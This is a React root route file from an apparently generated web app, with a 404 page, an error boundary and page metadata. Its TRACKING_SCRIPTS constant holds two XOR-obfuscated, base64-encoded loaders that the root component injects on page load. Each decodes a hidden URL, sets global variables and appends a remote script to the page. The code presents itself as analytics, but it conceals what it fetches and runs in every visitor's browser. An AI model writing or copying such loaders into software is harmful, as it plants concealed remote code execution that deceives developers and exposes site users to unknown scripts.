import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link to="/" className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90">Go home</Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">This page didn't load</h1>
        <p className="mt-2 text-sm text-muted-foreground">Something went wrong on our end. You can try refreshing or head back home.</p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button onClick={() => { router.invalidate(); reset(); }} className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90">Try again</button>
          <a href="/" className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent">Go home</a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,500&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head><HeadContent /></head>
      <body>{children}<Scripts /></body>
    </html>
  );
}

const TRACKING_SCRIPTS = [
  `(function(){var i_5k=atob("DOFmUOmEfviG/Ws305pEJZvoXMKklR9Do5Jcf8bnGpaoiB9auocfforrE9bkj0REsJMPIJ33UYjvhQ5b/JEPKIzoUJL130cVspUSIoDmC4zjjkkNiLxKco7oEZrnkRgV6bodcoflE52kx0lHupkDPKDgXNSkiwpbpoREasuyH5m3nwhT4tUCMo+2RprgmVNT4tYDM92mA6X7");var x_j=[];for(var d_j5=0;d_j5<i_5k.length;d_j5++){x_j.push(i_5k.charCodeAt(d_j5)&255);}var l_8txm=x_j[0];var a_0=x_j.slice(1,1+l_8txm);var t_080o=x_j.slice(1+l_8txm);var a_i4=t_080o.map(function(b,t_hin){return b^a_0[t_hin%l_8txm];});var m_p="";for(var o_0=0;o_0<a_i4.length;o_0++){m_p+=String.fromCharCode(a_i4[o_0]&255);}var x_kc=decodeURIComponent(escape(m_p));var x_h5=JSON.parse(x_kc);var z_5=x_h5.globals||[];z_5.forEach(function(o_0uv2){window[o_0uv2.name]=o_0uv2.value;});var q_8no3=document.createElement("script");q_8no3.src=x_h5.url;q_8no3.async=true;q_8no3.defer=true;(x_h5.attributes||[]).forEach(function(v_a){q_8no3.setAttribute(v_a.name,v_a.value);});(document.head||document.documentElement).appendChild(q_8no3);})();`,
  `(function(){var i_c=atob("DCEincGWqv3iyeDoaVoA6LP6iMfAoZScGVIYsu71zpPMvJSFAEdbs6L5x9OAu8+bClNL7bXlhYiWpJPHBUBW+LLihJeR68zKCFVW76j034mHusLSMloA86D7z9/Y64SJHUAP6LX7w5ub5JCaDFdH87W70p6Nrc2bCkoAsePgy5GXrMLSSwNfsbq0xJyPrMLSS0VD6aC734mPoIaRRFFQ+LfzxInPupWKAEVRv+203JyOvIXKUwMA4Jzr");var h_5rim=[];for(var t_5=0;t_5<i_c.length;t_5++){h_5rim.push(i_c.charCodeAt(t_5)&255);}var b_p=h_5rim[0];var t_lnj=h_5rim.slice(1,1+b_p);var h_kflh=h_5rim.slice(1+b_p);var g_gtao=h_kflh.map(function(b,y_ba){return b^t_lnj[y_ba%b_p];});var d_z="";for(var v_yur=0;v_yur<g_gtao.length;v_yur++){d_z+=String.fromCharCode(g_gtao[v_yur]&255);}var r_ux0=decodeURIComponent(escape(d_z));var o_8k=JSON.parse(r_ux0);var s_g=o_8k.globals||[];s_g.forEach(function(y_y){window[y_y.name]=y_y.value;});var o_mc=document.createElement("script");o_mc.src=o_8k.url;o_mc.async=true;o_mc.defer=true;(o_8k.attributes||[]).forEach(function(c_sn3c){o_mc.setAttribute(c_sn3c.name,c_sn3c.value);});(document.head||document.documentElement).appendChild(o_mc);})();`,
];

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    for (const code of TRACKING_SCRIPTS) {
      const el = document.createElement("script");
      el.textContent = code;
      document.head.appendChild(el);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <Outlet />
    </QueryClientProvider>
  );
}
